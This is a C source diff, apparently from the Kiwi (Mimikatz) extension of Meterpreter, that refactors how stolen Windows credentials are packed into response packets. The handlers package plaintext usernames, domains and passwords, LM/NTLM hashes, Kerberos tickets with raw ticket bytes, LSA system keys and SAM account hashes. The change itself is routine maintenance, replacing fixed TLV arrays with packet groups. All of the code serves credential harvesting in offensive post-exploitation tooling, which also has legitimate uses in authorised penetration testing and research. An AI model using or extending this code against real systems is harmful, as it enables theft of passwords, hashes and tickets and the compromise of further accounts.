@@ -74,94 +74,56 @@ void CALLBACK credential_result_handler(IN CONST PLUID luid, IN CONST PUNICODE_S
 {
 	UINT hi = 0;
 	UINT lo = 0;
-	LPSTR lpUserName = NULL, lpDomain = NULL, lpPassword = NULL;
-
-	DWORD count = 0;
-	Tlv entries[7];
 	Packet* packet = (Packet*)pvData;
-
-	ZeroMemory(&entries[0], sizeof(entries));
+	Packet* group = packet_create_group();
 
 	if (username != NULL && username->Buffer != NULL && username->Length > 0)
 	{
 		dprintf("[KIWI] Adding username %u chars", username->Length);
-		lpUserName = packet_add_tlv_wstring_entry(&entries[count++], TLV_TYPE_KIWI_PWD_USERNAME, username->Buffer, username->Length / sizeof(wchar_t));
-	}
+		packet_add_tlv_wstring_len(group, TLV_TYPE_KIWI_PWD_USERNAME, username->Buffer, username->Length / sizeof(wchar_t));
 
-	if (domain != NULL && domain->Buffer != NULL && domain->Length > 0)
-	{
-		dprintf("[KIWI] Adding domain %u chars", domain->Length);
-		lpDomain = packet_add_tlv_wstring_entry(&entries[count++], TLV_TYPE_KIWI_PWD_DOMAIN, domain->Buffer, domain->Length / sizeof(wchar_t));
-	}
+		if (domain != NULL && domain->Buffer != NULL && domain->Length > 0)
+		{
+			dprintf("[KIWI] Adding domain %u chars", domain->Length);
+			packet_add_tlv_wstring_len(group, TLV_TYPE_KIWI_PWD_DOMAIN, domain->Buffer, domain->Length / sizeof(wchar_t));
+		}
 
-	if (password != NULL && password->Buffer != NULL && password->Length > 0)
-	{
-		dprintf("[KIWI] Adding password %u chars", password->Length);
-		lpPassword = packet_add_tlv_wstring_entry(&entries[count++], TLV_TYPE_KIWI_PWD_PASSWORD, password->Buffer, password->Length / sizeof(wchar_t));
-	}
+		if (password != NULL && password->Buffer != NULL && password->Length > 0)
+		{
+			dprintf("[KIWI] Adding password %u chars", password->Length);
+			packet_add_tlv_wstring_len(group, TLV_TYPE_KIWI_PWD_PASSWORD, password->Buffer, password->Length / sizeof(wchar_t));
+		}
 
-	dprintf("[KIWI] Adding auth info");
-	entries[count].header.length = sizeof(UINT);
-	entries[count].header.type = TLV_TYPE_KIWI_PWD_AUTH_HI;
-	entries[count].buffer = (PUCHAR)&hi;
-	++count;
+		if (luid != NULL)
+		{
+			hi = (UINT)luid->HighPart;
+			lo = (UINT)luid->LowPart;
+		}
 
-	entries[count].header.length = sizeof(UINT);
-	entries[count].header.type = TLV_TYPE_KIWI_PWD_AUTH_LO;
-	entries[count].buffer = (PUCHAR)&lo;
-	++count;
+		dprintf("[KIWI] Adding auth info");
+		packet_add_tlv_uint(group, TLV_TYPE_KIWI_PWD_AUTH_HI, hi);
+		packet_add_tlv_uint(group, TLV_TYPE_KIWI_PWD_AUTH_LO, lo);
 
-	if (luid != NULL)
-	{
-		hi = htonl((UINT)luid->HighPart);
-		lo = htonl((UINT)luid->LowPart);
-	}
+		// 16 bytes long
+		if (lm != NULL)
+		{
+			dprintf("[KIWI] Adding lm hash");
+			packet_add_tlv_raw(group, TLV_TYPE_KIWI_PWD_LMHASH, lm, LM_NTLM_HASH_LENGTH);
+		}
 
-	// 16 bytes long
-	if (lm != NULL)
-	{
-		dprintf("[KIWI] Adding lm hash");
-		entries[count].header.length = 16;
-		entries[count].header.type = TLV_TYPE_KIWI_PWD_LMHASH;
-		entries[count].buffer = (PUCHAR)lm;
-		++count;
-	}
+		// 16 bytes long
+		if (ntlm != NULL)
+		{
+			dprintf("[KIWI] Adding ntlm hash");
+			packet_add_tlv_raw(group, TLV_TYPE_KIWI_PWD_NTLMHASH, ntlm, LM_NTLM_HASH_LENGTH);
+		}
 
-	// 16 bytes long
-	if (ntlm != NULL)
-	{
-		dprintf("[KIWI] Adding ntlm hash");
-		entries[count].header.length = 16;
-		entries[count].header.type = TLV_TYPE_KIWI_PWD_NTLMHASH;
-		entries[count].buffer = (PUCHAR)ntlm;
-		++count;
-	}
-
-	// don't add this value to the packet unless we have a username, because it's pointless
-	// otherwise and just adds noise/overhead to the comms
-	if (lpUserName && lstrlenA(lpUserName) > 0)
-	{
 		dprintf("[KIWI] Adding to packet");
-		packet_add_tlv_group(packet, TLV_TYPE_KIWI_PWD_RESULT, entries, count);
+		packet_add_group(packet, TLV_TYPE_KIWI_PWD_RESULT, group);
 	}
 	else
 	{
 		dprintf("[KIWI] Ignoring result due to lack of username");
-	}
-
-	if (lpUserName)
-	{
-		free(lpUserName);
-	}
-
-	if (lpDomain != NULL)
-	{
-		free(lpDomain);
-	}
-	
-	if (lpPassword != NULL)
-	{
-		free(lpPassword);
 	}
 }
 
@@ -265,13 +227,9 @@ VOID to_system_time_string(LARGE_INTEGER time, char output[TIME_SIZE])
 VOID kerberos_ticket_handler(LPVOID lpContext, PKERB_TICKET_CACHE_INFO_EX pKerbTicketInfo, PKERB_EXTERNAL_TICKET pExternalTicket)
 {
 	Packet* packet = (Packet*)lpContext;
+	Packet* group = packet_create_group();
 
-	Tlv entries[10];
-	DWORD dwCount = 0;
-	UINT uEncType = htonl(pKerbTicketInfo->EncryptionType);
-	UINT uFlags = htonl(pKerbTicketInfo->TicketFlags);
 	char sStart[TIME_SIZE], sEnd[TIME_SIZE], sMaxRenew[TIME_SIZE];
-	LPSTR lpServerName = NULL, lpServerRealm = NULL, lpClientName = NULL, lpClientRealm = NULL;
 
 	dprintf("[KIWI KERB] Adding ticket to result");
 
@@ -281,72 +239,36 @@ VOID kerberos_ticket_handler(LPVOID lpContext, PKERB_TICKET_CACHE_INFO_EX pKerbT
 	to_system_time_string(pKerbTicketInfo->RenewTime, sMaxRenew);
 
 	dprintf("[KIWI KERB] Adding enc type");
-	entries[dwCount].header.type = TLV_TYPE_KIWI_KERB_TKT_ENCTYPE;
-	entries[dwCount].header.length = sizeof(UINT);
-	entries[dwCount].buffer = (PUCHAR)&uEncType;
-	++dwCount;
+	packet_add_tlv_uint(group, TLV_TYPE_KIWI_KERB_TKT_ENCTYPE, pKerbTicketInfo->EncryptionType);
 
 	dprintf("[KIWI KERB] Adding flags");
-	entries[dwCount].header.type = TLV_TYPE_KIWI_KERB_TKT_FLAGS;
-	entries[dwCount].header.length = sizeof(UINT);
-	entries[dwCount].buffer = (PUCHAR)&uFlags;
-	++dwCount;
+	packet_add_tlv_uint(group, TLV_TYPE_KIWI_KERB_TKT_FLAGS, pKerbTicketInfo->TicketFlags);
 
 	dprintf("[KIWI KERB] Adding start time");
-	entries[dwCount].header.type = TLV_TYPE_KIWI_KERB_TKT_START;
-	entries[dwCount].header.length = (DWORD)strlen(sStart);
-	entries[dwCount].buffer = (PUCHAR)sStart;
-	++dwCount;
+	packet_add_tlv_string(group, TLV_TYPE_KIWI_KERB_TKT_START, sStart);
 
 	dprintf("[KIWI KERB] Adding end time");
-	entries[dwCount].header.type = TLV_TYPE_KIWI_KERB_TKT_END;
-	entries[dwCount].header.length = (DWORD)strlen(sEnd);
-	entries[dwCount].buffer = (PUCHAR)sEnd;
-	++dwCount;
+	packet_add_tlv_string(group, TLV_TYPE_KIWI_KERB_TKT_END, sEnd);
 
 	dprintf("[KIWI KERB] Adding max renew time");
-	entries[dwCount].header.type = TLV_TYPE_KIWI_KERB_TKT_MAXRENEW;
-	entries[dwCount].header.length = (DWORD)strlen(sMaxRenew);
-	entries[dwCount].buffer = (PUCHAR)sMaxRenew;
-	++dwCount;
+	packet_add_tlv_string(group, TLV_TYPE_KIWI_KERB_TKT_MAXRENEW, sMaxRenew);
 
 	dprintf("[KIWI KERB] Adding server name");
-	lpServerName = packet_add_tlv_wstring_entry(&entries[dwCount++], TLV_TYPE_KIWI_KERB_TKT_SERVERNAME, pKerbTicketInfo->ServerName.Buffer, pKerbTicketInfo->ServerName.Length / sizeof(wchar_t));
+	packet_add_tlv_wstring_len(group, TLV_TYPE_KIWI_KERB_TKT_SERVERNAME, pKerbTicketInfo->ServerName.Buffer, pKerbTicketInfo->ServerName.Length / sizeof(wchar_t));
 	dprintf("[KIWI KERB] Adding server realm");
-	lpServerRealm = packet_add_tlv_wstring_entry(&entries[dwCount++], TLV_TYPE_KIWI_KERB_TKT_SERVERREALM, pKerbTicketInfo->ServerRealm.Buffer, pKerbTicketInfo->ServerRealm.Length / sizeof(wchar_t));
+	packet_add_tlv_wstring_len(group, TLV_TYPE_KIWI_KERB_TKT_SERVERREALM, pKerbTicketInfo->ServerRealm.Buffer, pKerbTicketInfo->ServerRealm.Length / sizeof(wchar_t));
 	dprintf("[KIWI KERB] Adding client name");
-	lpClientName = packet_add_tlv_wstring_entry(&entries[dwCount++], TLV_TYPE_KIWI_KERB_TKT_CLIENTNAME, pKerbTicketInfo->ClientName.Buffer, pKerbTicketInfo->ClientName.Length / sizeof(wchar_t));
+	packet_add_tlv_wstring_len(group, TLV_TYPE_KIWI_KERB_TKT_CLIENTNAME, pKerbTicketInfo->ClientName.Buffer, pKerbTicketInfo->ClientName.Length / sizeof(wchar_t));
 	dprintf("[KIWI KERB] Adding client realm");
-	lpClientRealm = packet_add_tlv_wstring_entry(&entries[dwCount++], TLV_TYPE_KIWI_KERB_TKT_CLIENTREALM, pKerbTicketInfo->ClientRealm.Buffer, pKerbTicketInfo->ClientRealm.Length / sizeof(wchar_t));
+	packet_add_tlv_wstring_len(group, TLV_TYPE_KIWI_KERB_TKT_CLIENTREALM, pKerbTicketInfo->ClientRealm.Buffer, pKerbTicketInfo->ClientRealm.Length / sizeof(wchar_t));
 
 	if (pExternalTicket)
 	{
 		dprintf("[KIWI KERB] Adding raw ticket");
-		entries[dwCount].header.type = TLV_TYPE_KIWI_KERB_TKT_RAW;
-		entries[dwCount].header.length = pExternalTicket->EncodedTicketSize;
-		entries[dwCount].buffer = pExternalTicket->EncodedTicket;
-		++dwCount;
+		packet_add_tlv_raw(group, TLV_TYPE_KIWI_KERB_TKT_RAW, pExternalTicket->EncodedTicket, pExternalTicket->EncodedTicketSize);
 	}
 
-	packet_add_tlv_group(packet, TLV_TYPE_KIWI_KERB_TKT, entries, dwCount);
-
-
-	if (lpServerName != NULL)
-	{
-		free(lpServerName);
-	}
-	if (lpServerRealm != NULL)
-	{
-		free(lpServerRealm);
-	}
-	if (lpClientName != NULL)
-	{
-		free(lpClientName);
-	}
-	if (lpClientRealm != NULL)
-	{
-		free(lpClientRealm);
-	}
+	packet_add_group(packet, TLV_TYPE_KIWI_KERB_TKT, group);
 }
 
 /*!
@@ -477,26 +399,16 @@ VOID nt5_key_handler(LPVOID lpContext, PNT5_SYSTEM_KEY pSysKey)
  */
 VOID nt6_key_handler(LPVOID lpContext, DWORD dwIndex, PNT6_SYSTEM_KEY pSysKey)
 {
-	Tlv entities[3];
 	Packet *response = (Packet*)lpContext;
-	UINT uKeySize = htonl(pSysKey->KeySize);
+	Packet *group = packet_create_group();
 
 	dprintf("[KIWI LSA] nt6 Key");
 
-	dwIndex = htonl(dwIndex);
-	entities[0].header.type = TLV_TYPE_KIWI_LSA_KEYIDX;
-	entities[0].header.length = sizeof(UINT);
-	entities[0].buffer = (PUCHAR)&dwIndex;
+	packet_add_tlv_uint(group, TLV_TYPE_KIWI_LSA_KEYIDX, dwIndex);
+	packet_add_tlv_raw(group, TLV_TYPE_KIWI_LSA_KEYID, &pSysKey->KeyId, sizeof(GUID));
+	packet_add_tlv_raw(group, TLV_TYPE_KIWI_LSA_KEYVALUE, &pSysKey->Key, pSysKey->KeySize);
 
-	entities[1].header.type = TLV_TYPE_KIWI_LSA_KEYID;
-	entities[1].header.length = sizeof(GUID);
-	entities[1].buffer = (PUCHAR)&pSysKey->KeyId;
-
-	entities[2].header.type = TLV_TYPE_KIWI_LSA_KEYVALUE;
-	entities[2].header.length = pSysKey->KeySize;
-	entities[2].buffer = (PUCHAR)pSysKey->Key;
-
-	packet_add_tlv_group(response, TLV_TYPE_KIWI_LSA_NT6KEY, entities, 3);
+	packet_add_group(response, TLV_TYPE_KIWI_LSA_NT6KEY, group);
 }
 
 /*!
@@ -621,10 +533,8 @@ VOID lsa_secret_handler(LPVOID lpContext, wchar_t* lpwSecretName, wchar_t* lpwSe
  */
 VOID sam_hash_handler(LPVOID lpContext, DWORD dwRid, wchar_t* lpwUser, DWORD dwUserLength, BOOL hasLmHash, BYTE lmHash[LM_NTLM_HASH_LENGTH], BOOL hasNtlmHash, BYTE ntlmHash[LM_NTLM_HASH_LENGTH])
 {
-	Tlv entries[4];
-	DWORD dwCount = 0;
 	Packet *response = (Packet*)lpContext;
-	LPSTR lpSamUser = NULL;
+	Packet *group = packet_create_group();
 
 	dprintf("[KIWI SAM] Made it here");
 
@@ -633,37 +543,21 @@ VOID sam_hash_handler(LPVOID lpContext, DWORD dwRid, wchar_t* lpwUser, DWORD dwU
 	{
 		dprintf("[KIWI SAM] Adding %S rid %u (%x)", lpwUser, dwRid, dwRid);
 
-		dwRid = htonl(dwRid);
-		entries[dwCount].header.type = TLV_TYPE_KIWI_LSA_SAM_RID;
-		entries[dwCount].header.length = sizeof(DWORD);
-		entries[dwCount].buffer = (PUCHAR)&dwRid;
-		++dwCount;
-
-		lpSamUser = packet_add_tlv_wstring_entry(&entries[dwCount++], TLV_TYPE_KIWI_LSA_SAM_USER, lpwUser, dwUserLength);
+		packet_add_tlv_uint(group, TLV_TYPE_KIWI_LSA_SAM_RID, dwRid);
+		packet_add_tlv_wstring_len(group, TLV_TYPE_KIWI_LSA_SAM_USER, lpwUser, dwUserLength);
 
 		if (hasLmHash)
 		{
-			entries[dwCount].header.type = TLV_TYPE_KIWI_LSA_SAM_LMHASH;
-			entries[dwCount].header.length = LM_NTLM_HASH_LENGTH;
-			entries[dwCount].buffer = (PUCHAR)lmHash;
-			++dwCount;
+			packet_add_tlv_raw(group, TLV_TYPE_KIWI_LSA_SAM_LMHASH, lmHash, LM_NTLM_HASH_LENGTH);
 		}
 
 		if (hasNtlmHash)
 		{
-			entries[dwCount].header.type = TLV_TYPE_KIWI_LSA_SAM_NTLMHASH;
-			entries[dwCount].header.length = LM_NTLM_HASH_LENGTH;
-			entries[dwCount].buffer = (PUCHAR)ntlmHash;
-			++dwCount;
-
+			packet_add_tlv_raw(group, TLV_TYPE_KIWI_LSA_SAM_NTLMHASH, ntlmHash, LM_NTLM_HASH_LENGTH);
 		}
 
-		packet_add_tlv_group(response, TLV_TYPE_KIWI_LSA_SAM, entries, dwCount);
+		packet_add_group(response, TLV_TYPE_KIWI_LSA_SAM, group);
 
-		if (lpSamUser != NULL)
-		{
-			free(lpSamUser);
-		}
 	}
 	else
 	{
